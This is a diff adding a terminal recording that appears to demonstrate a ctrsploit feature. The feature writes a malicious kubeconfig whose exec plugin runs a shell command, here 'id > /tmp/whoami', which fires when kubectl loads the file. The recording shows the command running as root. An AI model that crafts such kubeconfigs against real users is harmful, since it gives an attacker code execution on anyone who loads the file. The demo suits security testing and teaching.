@@ -1,0 +1,11 @@
+{"version":2,"width":80,"height":24,"timestamp":1781082379,"command":"expect -f demo.exp","env":{"SHELL":"/usr/bin/zsh"}}
+[0.0, "o", "\u001b]0;root@k8s: ~\u0007root@k8s:~# ctrsploit vul kubeconfig user-exec x -c 'id > /tmp/whoami'\r\r\n\u001b[?2004l\r"]
+[0.086, "o", "\u001b[33mWARN\u001b[0m[0000] --output not set, saving to /root/malicious-kubeconfig.yaml \r\r\n\u001b[36mINFO\u001b[0m[0000] Malicious kubeconfig written to /root/malicious-kubeconfig.yaml \r\r\n\u001b[33mWARN\u001b[0m[0000]                                              \r\r\n\u001b[33mWARN\u001b[0m[0000] === Exploit Payload ===                      \r\r\n\u001b[33mWARN\u001b[0m[0000] Loading this kubeconfig will execute:        \r\r\n\u001b[33mWARN\u001b[0m[0000]   Command: /bin/sh                           \r\r\n\u001b[33mWARN\u001b[0m[0000]   Args:    [-c id > /tmp/whoami]             \r\r\n\u001b[33mWARN\u001b[0m[0000]                                              \r\r\n\u001b[33mWARN\u001b[0m[0000] To demonstrate, run:                         \r\r\n\u001b[33mWARN\u001b[0m[0000]   kubectl --kubeconfig /root/malicious-kubeconfig.yaml get pods \r\r\n\u001b[33mWARN\u001b[0m[0000]   (the exec plugin in users[].user.exec will run /bin/sh) \r\r\n"]
+[0.088, "o", "\u001b[?2004h\u001b]0;root@k8s: ~\u0007root@k8s:~# "]
+[1.3, "o", "kubectl --kubeconfig ~/malicious-kubeconfig.yaml get pods 2>&1 | grep Unable\r\r\n\u001b[?2004l\r"]
+[1.36, "o", "\u001b[01;31m\u001b[KUnable\u001b[m\u001b[K to connect to the server: getting credentials: exec plugin is configured to use API version client.authentication.k8s.io/v1beta1, plugin returned version client.authentication.k8s.io/__internal\r\r\n"]
+[1.362, "o", "\u001b[?2004h\u001b]0;root@k8s: ~\u0007root@k8s:~# "]
+[2.8, "o", "cat /tmp/whoami\r\r\n\u001b[?2004l\r"]
+[2.84, "o", "uid=0(root) gid=0(root) groups=0(root)\r\r\n"]
+[2.842, "o", "\u001b[?2004h\u001b]0;root@k8s: ~\u0007root@k8s:~# "]
+[7.2, "x", "0"]
